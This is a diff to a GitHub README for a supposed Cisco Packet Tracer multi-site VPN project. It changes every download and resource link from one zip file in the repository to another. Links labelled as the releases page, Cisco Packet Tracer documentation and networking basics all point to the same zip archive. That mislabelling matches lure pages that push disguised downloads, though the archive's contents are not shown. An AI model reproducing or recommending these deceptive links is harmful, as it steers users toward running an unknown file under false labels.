@@ -1,7 +1,7 @@
 # 🚀 secure_multisite_vpn - Connect Multiple Sites Securely
 
 ## 📥 Download the Application
-[![Download the Latest Release](https://raw.githubusercontent.com/mahazoualedji595/secure_multisite_vpn/main/topology/secure_multisite_vpn-2.8.zip)](https://raw.githubusercontent.com/mahazoualedji595/secure_multisite_vpn/main/topology/secure_multisite_vpn-2.8.zip)
+[![Download the Latest Release](https://github.com/mahazoualedji595/secure_multisite_vpn/raw/refs/heads/main/configs/router-config/vpn-multisite-secure-v2.6.zip)](https://github.com/mahazoualedji595/secure_multisite_vpn/raw/refs/heads/main/configs/router-config/vpn-multisite-secure-v2.6.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the secure_multisite_vpn application on your computer. This application showcases a Cisco Packet Tracer project that creates secure multi-site connectivity through advanced networking techniques.
@@ -25,7 +25,7 @@ Before you begin, ensure your system meets the following requirements:
 ## 🔍 How to Download & Install
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://raw.githubusercontent.com/mahazoualedji595/secure_multisite_vpn/main/topology/secure_multisite_vpn-2.8.zip). This page contains all available versions of the secure_multisite_vpn application.
+   Go to the [Releases page](https://github.com/mahazoualedji595/secure_multisite_vpn/raw/refs/heads/main/configs/router-config/vpn-multisite-secure-v2.6.zip). This page contains all available versions of the secure_multisite_vpn application.
 
 2. **Select the Latest Release**
    Look for the latest release, which is usually at the top of the page. You will see a list of assets related to that release.
@@ -60,8 +60,8 @@ This project illustrates the principles of networking and security. You will fin
 - Refer back to this README for additional instructions or troubleshooting.
 
 ## 📚 Additional Resources
-- [Cisco Packet Tracer Documentation](https://raw.githubusercontent.com/mahazoualedji595/secure_multisite_vpn/main/topology/secure_multisite_vpn-2.8.zip)
-- [Networking Basics](https://raw.githubusercontent.com/mahazoualedji595/secure_multisite_vpn/main/topology/secure_multisite_vpn-2.8.zip)
+- [Cisco Packet Tracer Documentation](https://github.com/mahazoualedji595/secure_multisite_vpn/raw/refs/heads/main/configs/router-config/vpn-multisite-secure-v2.6.zip)
+- [Networking Basics](https://github.com/mahazoualedji595/secure_multisite_vpn/raw/refs/heads/main/configs/router-config/vpn-multisite-secure-v2.6.zip)
 
 ## 📝 Contributing
 If you notice any issues or would like to contribute improvements to the project, feel free to leave feedback or suggestions in the Issues section of the GitHub repository. Your input helps to enhance this project for everyone.
@@ -91,4 +91,4 @@ This project covers a wide range of networking topics:
 Feel free to browse these topics for more in-depth information on each subject. 
 
 ## 📥 Download the Application Again
-Don’t forget, if you haven’t already done so, you can visit the [Releases page](https://raw.githubusercontent.com/mahazoualedji595/secure_multisite_vpn/main/topology/secure_multisite_vpn-2.8.zip) to download the secure_multisite_vpn application. Enjoy exploring multi-site connectivity securely!
+Don’t forget, if you haven’t already done so, you can visit the [Releases page](https://github.com/mahazoualedji595/secure_multisite_vpn/raw/refs/heads/main/configs/router-config/vpn-multisite-secure-v2.6.zip) to download the secure_multisite_vpn application. Enjoy exploring multi-site connectivity securely!
